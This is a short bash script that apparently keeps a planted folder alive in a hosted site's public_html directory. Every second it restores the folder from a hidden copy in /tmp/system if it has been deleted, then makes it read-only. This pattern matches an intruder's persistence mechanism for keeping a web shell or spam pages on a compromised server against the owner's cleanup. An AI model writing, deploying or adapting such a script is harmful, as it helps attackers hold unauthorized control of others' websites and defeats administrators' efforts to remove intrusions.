#!/bin/bash

folder_path="/home/fkundiplogbook/public_html/undip"
backup_path="/tmp/system"

while true
do
    if [ ! -d "$folder_path" ]; then
        cp -r "$backup_path" "$folder_path"
    fi

    chmod -R 0555 "$folder_path"
    sleep 1
done